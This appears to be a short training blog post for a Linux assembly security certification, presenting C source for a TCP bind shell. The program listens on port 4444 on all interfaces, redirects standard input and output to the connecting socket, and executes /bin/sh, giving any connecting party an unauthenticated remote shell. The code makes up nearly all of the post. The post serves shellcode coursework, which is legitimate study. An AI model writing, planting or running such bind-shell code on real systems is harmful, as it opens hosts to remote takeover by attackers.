## Assignment 0x01: Create A Shell_Bind_TCP Shellcode
---
```c++
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main ()
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

---
[Home](https://norrismw.github.io/SLAE)
